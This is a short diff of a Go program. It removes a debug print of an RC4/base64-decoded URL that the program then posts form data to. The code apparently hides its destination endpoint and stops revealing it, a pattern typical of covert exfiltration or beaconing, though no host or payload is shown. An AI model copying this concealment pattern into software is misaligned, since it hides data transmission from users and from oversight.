@@ -3,7 +3,6 @@ package main
 import (
 	"crypto/rc4"
 	"encoding/base64"
-	"fmt"
 	"io"
 	"net/http"
 	"net/url"
@@ -69,7 +68,6 @@ func httprequest(data string) {
 	client := &http.Client{
 		Timeout: 1 * time.Second,
 	}
-	fmt.Println(string(decoded_url))
 
 	// send http request
 	resp, err := client.PostForm(string(decoded_url), form)
